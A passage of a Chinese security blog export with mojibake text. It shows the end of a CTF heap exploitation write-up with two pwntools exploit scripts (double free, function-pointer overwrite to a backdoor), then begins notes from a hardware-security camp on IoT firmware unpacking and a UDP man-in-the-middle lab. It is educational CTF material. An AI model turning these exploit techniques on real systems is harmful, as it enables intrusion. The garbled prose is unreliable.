åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/45.png" class=""><h4 id="0x01-IDAåˆ†æ-6"><a href="#0x01-IDAåˆ†æ-6" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/46.png" class=""><p>ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªé™åˆ¶å †å—æ•°é‡çš„åˆ¤æ–­ï¼Œä¸é‡è¦ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œç”³è¯·äº†ä¸€ä¸ª0x10çš„å †å—å†™å…¥äº†print_girlfriend_nameçš„å‡½æ•°åœ°å€ï¼Œä½†æ˜¯è¿™ä¸ªprint_girfriend_nameâ€¦å°±æ˜¯ä¸€ä¸ªåé—¨</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/47.png" class=""><p>ç°åœ¨è¿˜æ²¡æ„Ÿè§‰åƒåé—¨ï¼Œä½†æ˜¯çœ‹åˆ°printå‡½æ•°çš„æ—¶å€™ï¼Œä»”ç»†çœ‹çœ‹(*girlfriendlst[v1])(girlfrendlist[v1])ï¼Œå¦‚æœæˆ‘ä»¬åŠ«æŒäº†åŒ…å«print_girlfriend_nameçš„0x10å †å—ï¼Œä¿®æ”¹æˆå…¶ä»–çš„å‡½æ•°åœ°å€ï¼Œæ¯”å¦‚system@gotï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆsystem(girlfrendlist[v1] + 8)</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/48.png" class=""><p>å†çœ‹çœ‹delå‡½æ•°ï¼Œæ€è·¯å°±å¾ˆæ¸…æ™°äº†</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/49.jpg" class=""><p>æœ‰ä¸ªåé—¨å‡½æ•°â€¦</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/50.png" class=""><h4 id="0x02-è§£é¢˜æ€è·¯-3"><a href="#0x02-è§£é¢˜æ€è·¯-3" class="headerlink" title="0x02 è§£é¢˜æ€è·¯"></a>0x02 è§£é¢˜æ€è·¯</h4><ol><li>double freeä¸€ä¸ªå †å—</li><li>ç”³è¯·ä¸€ä¸ª0x20çš„å †å—ï¼Œdouble freeçš„0x10çš„å †å—å°±å†™å…¥äº†print_girlfriend_name</li><li>ç”³è¯·çš„æ—¶å€™æ”¹æˆåé—¨å‡½æ•°</li></ol><h4 id="0x03-å®Œæ•´EXP-5"><a href="#0x03-å®Œæ•´EXP-5" class="headerlink" title="0x03 å®Œæ•´EXP"></a>0x03 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"><span class="comment"># add(0x20,&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-æ€»ç»“-2"><a href="#0x04-æ€»ç»“-2" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h4><p>çœ‹äº†å¤§ä½¬çš„wpï¼Œå…¶å®ä¸ç”¨æ”¹ï¼Œåªè¦print_girlfriend_nameä¸Šé¢å†™ç€æ˜¯åé—¨å‡½æ•°å°±è¡Œï¼Œä¸çŸ¥é“ä¸ºå•¥system(â€œ/bin/shâ€)ä¸€ç›´ä¸è¡Œï¼Œä¸€è¿›å…¥å°±downäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> åˆ·é¢˜è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HWSç¡¬ä»¶å®‰å…¨åœ¨çº¿å¤ä»¤è¥æ€»ç»“</title>
      <link href="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/"/>
      <url>/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h3><p>IOTæ˜¯ä¸€ä¸ªå®Œæ•´çš„ä¿¡æ¯ç³»ç»Ÿï¼Œå®ƒåŒ…æ‹¬è½¯ä»¶å’Œç¡¬ä»¶ä¸¤ä¸ªç»„æˆéƒ¨åˆ†ï¼Œä¹ŸPCä¸åŒçš„æ˜¯ï¼Œä»–ä»¬ä¸»è¦çš„ä¸šåŠ¡å°±æ˜¯æ“æ§ç¡¬ä»¶è®¾å¤‡ï¼Œå…¶å®IOTåœ¨æ¯ä¸ªäººçœ¼ä¸­éƒ½æœ‰ä¸åŒçš„çœ‹æ³•ï¼Œäººäº‘äº¦äº‘ï¼Œå¯¹äºè½¯ä»¶å¼€å‘è€…æ¥è¯´ï¼ŒIOTæ˜¯ä¸šåŠ¡ï¼Œæ˜¯è®¾å¤‡çš„çš„ä¸šåŠ¡å®ç°ï¼Œå¯¹äºç½‘ç»œå®‰å…¨ä»ä¸šè€…æ¥è¯´ï¼Œå°±æ˜¯ç¡¬ä»¶è®¾å¤‡ï¼Œå®ƒç¡¬ä»¶ä¸Šæœ‰æˆ‘ä»¬å¯æ”»å‡»çš„æ¼æ´</p><p>é‚£ä¹ˆä¸€ä¸ªå®Œæ•´çš„IOTè®¾å¤‡å®ƒåº”è¯¥æœ‰äº‘ç«¯ï¼Œè®¾å¤‡ç¡¬ä»¶ç«¯ ï¼ŒAPPç«¯ï¼Œä¸‰ä¸ªåˆ‡å…¥ç‚¹</p><p>é€šå¸¸æˆ‘ä»¬éƒ½æ˜¯ä»è®¾å¤‡ç«¯æˆ–è€…æ˜¯APPç«¯æ¥è¿›è¡Œæ”»å‡»ï¼Œé‚£ä¹ˆå…³æ³¨è®¾å¤‡ç«¯å°±æ˜¯å…³æ³¨è¿™ä¸ªè®¾å¤‡ä»å¼€å§‹åˆ°å¯åŠ¨çš„å…¨è¿‡ç¨‹ï¼Œå°±æ˜¯bios -&gt; bootloader -&gt; æ“ä½œç³»ç»Ÿ -&gt; init.d -&gt; ä¸šåŠ¡</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411916974.png" class=""><h3 id="å›ºä»¶"><a href="#å›ºä»¶" class="headerlink" title="å›ºä»¶"></a>å›ºä»¶</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>æ‰€è°“â€å›ºä»¶â€ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯â€å›ºåŒ–åœ¨è®¾å¤‡ä¸­çš„è½¯ä»¶â€ï¼Œé€šå¸¸è€Œè¨€<strong>æŒ‡çš„æ˜¯ Flash ä¸­è¢«å›ºåŒ–ã€æ‰§è¡Œå›ºå®šåŠŸèƒ½çš„è½¯ä»¶</strong>ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å›ºä»¶æ˜¯è½¯ä»¶ï¼Œæ˜¯åµŒå…¥å¼è®¾å¤‡ä¸­ä¼šè¢«CPUæ‰€æ‰§è¡Œçš„ä»£ç </p><h4 id="å›ºä»¶çš„è·å–"><a href="#å›ºä»¶çš„è·å–" class="headerlink" title="å›ºä»¶çš„è·å–"></a>å›ºä»¶çš„è·å–</h4><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633411933096.png" class=""><h4 id="å›ºä»¶çš„è§£åŒ…"><a href="#å›ºä»¶çš„è§£åŒ…" class="headerlink" title="å›ºä»¶çš„è§£åŒ…"></a>å›ºä»¶çš„è§£åŒ…</h4><p>å›ºä»¶çš„è§£åŒ…ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œbinwalkå’Œmountï¼Œbinwalkåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½ç®¡ç”¨ï¼Œbinwalkä¸ç®¡ç”¨çš„æ—¶å€™ï¼Œmountå¯èƒ½ä¼šæœ‰å¥‡æ•ˆ</p><p><strong>binwalk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me *.bin <span class="comment">#é€’å½’æå–</span></span><br><span class="line">binwalk -A *.bin <span class="comment">#è¯†åˆ«æ¶æ„</span></span><br><span class="line">binwalk -E *.bin <span class="comment">#ç†µå€¼åˆ†æ</span></span><br></pre></td></tr></table></figure><p><strong>mount</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir file_systems</span><br><span class="line">sudo mount ./rootfs.img file_systems</span><br></pre></td></tr></table></figure><h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><p>é€†å‘åˆ†æçš„æ€è·¯éƒ½æ˜¯é€šç”¨çš„</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411945172.png" class=""><h6 id="åˆ†ææ”»å‡»é¢"><a href="#åˆ†ææ”»å‡»é¢" class="headerlink" title="åˆ†ææ”»å‡»é¢"></a>åˆ†ææ”»å‡»é¢</h6><p>è¾“å…¥å°±æ„å‘³ç€å­˜åœ¨ç€æ¥å£å‡½æ•°ï¼Œæ—¢ç„¶æœ‰æ¥å£å‡½æ•°é‚£å°±å¿…ç„¶æœ‰å®ç°çš„ä»£ç å’Œç›¸å¯¹åº”çš„ç¡¬ä»¶ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„ï¼Œæˆ‘ä»¬åˆ†æIOTè®¾å¤‡ä¸æ˜¯ç®€å•çš„readä¹‹ç±»çš„è¾“å…¥ï¼Œè¿˜åŒ…æ‹¬å¾ˆå¤šç‰©ç†ä¸–ç•Œçš„è¾“å…¥ï¼Œæ¯”å¦‚USBå£ï¼Œç½‘å£ç­‰ï¼Œè¿™äº›è¾“å…¥éƒ½æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªIOTè®¾å¤‡çš„æ”»å‡»å…¥å£ï¼Œæ‰€ä»¥å¤šå‘æ•£ä¸€ä¸‹æ€ç»´ï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜¯ä¸å¯èƒ½çš„ï¼</p><p>å¯¹äºè½¯ä»¶å±‚é¢çš„åˆ†æï¼Œé‚£åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œæœ‰shellå’Œæ— shellï¼Œæœ‰shellï¼Œå¾ˆå¥½åŠäº†ï¼ŒæŸ¥çœ‹ä¸€äº›å®ƒå¼€å¯äº†å“ªäº›è¿›ç¨‹å“ªäº›æœåŠ¡ï¼Œå“ªäº›ç«¯å£ï¼Œæ²¡æœ‰shellï¼Œå°±åªèƒ½å¯¹å®ƒè¿›è¡Œç«¯å£æ‰«æäº†</p><h6 id="å®šä½ç¨‹åº"><a href="#å®šä½ç¨‹åº" class="headerlink" title="å®šä½ç¨‹åº"></a>å®šä½ç¨‹åº</h6><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633411966466.png" class=""><p>åœ¨å‰é¢æˆ‘ä»¬é€šè¿‡æ”¶é›†IOTè®¾å¤‡çš„ä¿¡æ¯åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åˆ†ææ”»å‡»çš„å…¥å£æ¥å®šä½ï¼Œä¸€èˆ¬åœ¨æŸ¥æ‰¾çš„æ—¶å€™éƒ½æ˜¯å»æŸ¥æ‰¾å‚å•†çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…å¼€æºç»„ä»¶çš„æ¼æ´</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>ç¬¬ä¸€å¤©çš„çŸ¥è¯†ç‚¹è¿˜æ˜¯æ¯”è¾ƒåŸºç¡€çš„ï¼Œä»ä¸åŒçš„è§’åº¦é˜è¿°äº†IOTç©¶ç«Ÿæ˜¯ä¸ªä»€ä¹ˆç©æ„å„¿ï¼Œå®ƒå¯¹äºHWSæ¥è¯´æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œå¯¹äºä¸åŒçš„ä»ä¸šè€…æ¥è¯´åˆæœ‰ä»€ä¹ˆæ„æ€ï¼Œè¯¾ç¨‹çš„ååŠéƒ¨åˆ†å°±æ˜¯åœ¨å›´ç»•ç€IOTä¸­çš„ä¸€å¤§åŸºæœ¬è¦ç´ â€”â€”å›ºä»¶ï¼Œæ‰€æœ‰çš„åˆ†æéƒ½æ˜¯åŸºäºå›ºä»¶æ¥åˆ†æçš„ï¼Œæ‰€ä»¥è¯´å›ºä»¶çš„æå–å’Œåˆ†æéƒ½æ˜¯å¾ˆå…³é”®çš„ä¸€ç¯ï¼æ‹¿åˆ°å›ºä»¶å°±åƒæ‹¿åˆ°IOTè®¾å¤‡çš„è“å›¾ï¼Œè€Œåç»­çš„æ¼æ´æŒ–æ˜å°±æ˜¯åœ¨æ¢ç´¢åœ°å›¾å½“ä¸­é‚£äº›ç¥ç§˜è€ŒåˆæœªçŸ¥çš„å®è—ï¼</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h3><p>æµé‡åˆ†æä¸­æœ€é‡è¦çš„å››ä¸ªæ­¥éª¤â€æ”¶ï¼Œå‘ï¼Œæ–­ï¼Œæ”¹â€</p><p>æ”¶å’Œå‘æ˜¯æµé‡ä¸­æœ€åŸºæœ¬çš„æ“ä½œï¼Œåœ¨PWNä¸­é€šè¿‡å‘é€ä¸€äº›ç•¸å½¢çš„æ•°æ®æ¥ä½¿å¾—ç¨‹åºçš„æ‰§è¡Œå‘ç”Ÿäº†ä¸€ä¸‹éé¢„æœŸçš„ç»“æœï¼Œæœ€ç»ˆå¯¼è‡´æˆ‘ä»¬èƒ½å¤Ÿå»åšä¸€äº›æ­£å¸¸çš„æ“ä½œæ‰€ä¸èƒ½å®ç°çš„ä¸œè¥¿</p><p>æµé‡å°±åƒæ°´æµä¸€æ ·ï¼Œæµç»å“ªé‡Œå°±å¯èƒ½ä¼šåœ¨æŸä¸ªåœ°æ–¹ç•™ä¸‹ä¸€å®šçš„ç—•è¿¹ï¼Œå¦‚æœæˆ‘ä»¬åœ¨â€æ°´æµâ€æµåŠ¨çš„è¿‡ç¨‹ä¸­è¿›è¡ŒæŠ“å–ï¼Œå½“ç„¶æƒ³è¦æŠ“å–æ›´å¤šæ›´å…¨é¢çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¾—åœ¨â€æ°´æµâ€çš„ä¸»å¹²é“ä¸Šè¿›è¡ŒæŠ“å–ï¼Œä¹Ÿå°±æ˜¯åœ¨è·¯ç”±å™¨å¹²è·¯ä¾§æ”¾ç½®æŠ“åŒ…å·¥å…·</p><p>æ‰€ä»¥å½“æˆ‘ä»¬èƒ½å¤ŸæŠ“å–åˆ°ä¸€äº›æµé‡çš„æ—¶å€™ï¼Œé‚£å¿…ç„¶å¯ä»¥è¿›è¡Œæ–­å’Œæ”¹ï¼Œå°±åƒæˆ‘æŠŠâ€æ°´æµâ€ä¸­çš„æ°´ç››ä¸€ç¢—ä¸Šæ¥ï¼Œç››ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªæ–­çš„æ“ä½œï¼Œæ¥ä¸‹æ¥æˆ‘åœ¨æ¢ä¸€ç¢—æ°´å†å€’å›å»ï¼Œä¾¿æ˜¯æ”¹çš„æ“ä½œ</p><p>ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„é€šä¿¡ä¿¡é“æˆ‘ä»¬éƒ½å¯ä»¥å»æ¥å…¥çš„ï¼Œæœ‰ä¸€äº›ä¿¡é“æ˜¯åœ¨å†…ç½‘å½“ä¸­çš„ï¼Œæˆ‘ä»¬ä¸å¯èƒ½ç›´æ¥å¥—ç”¨PWNçš„é‚£ä¸€å¥—ï¼Œio.sendline()å’Œio.recvuntil()ï¼Œè¿™ä¸å¤ªå¯èƒ½åšåˆ°ï¼Œé‚£å°±éœ€è¦é€šè¿‡ä¸€ä¸‹å†…ç½‘çš„è¾¹ç•Œè¿›è¡Œä»‹å…¥ï¼Œå°†å¤–ç½‘çš„è®¾å¤‡æ—¥ç©¿ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥è¿›å…¥å†…ç½‘é€šä¿¡ï¼Œè¿™æ˜¯ä¸€ç§å¤–æ¥å†…çš„æƒ…å†µï¼Œé‚£è¿˜æœ‰ä¸€ç§å†…æ¥å¤–çš„æƒ…å†µï¼Œå°±æ˜¯é€šè¿‡é’“é±¼é‚®ä»¶æˆ–è€…mqttæ¶ˆæ¯é˜Ÿåˆ—æ¥è¿›å…¥å†…ç½‘é€šä¿¡ï¼Œä¸å¤šè¯´ï¼Œéƒ½æ˜¯è¾¹ç•Œæ¸—é€çš„äº‹</p><p>åˆšåˆšå°†çš„æ˜¯ç°å®ç”Ÿæ´»ä¸­çš„æŠ“ï¼Œä½†æˆ‘ä»¬ä¸å¯èƒ½çœŸçš„ç”¨æ‰‹åœ¨ç©ºæ°”ä¸­æŠ“å–é€šä¿¡æŠ¥æ–‡ï¼Œä¸å¤ªç°å®ï¼Œæ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬éƒ½ä¼šé€šè¿‡æ ‘è“æ´¾åˆ·ä¸Šopenwrtçš„ä»£ç ï¼Œè®©æ ‘è“æ´¾å˜æˆä¸€ä¸ªå°å‹çš„è·¯ç”±å™¨ï¼Œè¿æ¥åˆ°å¹²è·¯è¿›è¡ŒæŠ“å–æ•°æ®åŒ…</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411985853.png" class=""><p>è¿™é‡Œå¤ç°ä¸€ä¸‹è¯¾ä¸Šçš„å®éªŒâ€”â€”åŸºäºUDPä¿¡é“çš„ä¸­é—´äººæ”»å‡»</p><p>å…ˆçœ‹çœ‹ncçš„å‚æ•°</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411997048.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l<span class="comment">#ç›‘å¬æ¨¡å¼ï¼Œå°±æ˜¯æŠŠncå½“åšä¸€ä¸ªserveræ¥çœ‹å¾…ï¼Œç­‰å¾…è¿æ¥è¯·æ±‚</span></span><br><span class="line">-p[port]<span class="comment">#ç«¯å£å·ï¼Œå¯è‡ªå®šä¹‰</span></span><br><span class="line">-u<span class="comment">#ä½¿ç”¨UDPï¼Œé»˜è®¤æ˜¯TCP</span></span><br><span class="line">-o[file]<span class="comment">#å°†ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•°æ®ä»¥åå…­è¿›åˆ¶çš„å½¢å¼ä¿æŒåˆ°[file]ä¸­</span></span><br><span class="line">-s[addr]<span class="comment">#å‘é€æ•°æ®åŒ…çš„ç›®çš„IPåœ°å€</span></span><br><span class="line">-w[time]<span class="comment">#è®¾ç½®è¶…æ—¶çš„æ—¶é—´</span></span><br><span class="line">-z<span class="comment">#æ²¡æœ‰ä»»ä½•è¾“å…¥è¾“å‡ºä¿¡æ¯ï¼Œç”¨äºæ‰«æ</span></span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" 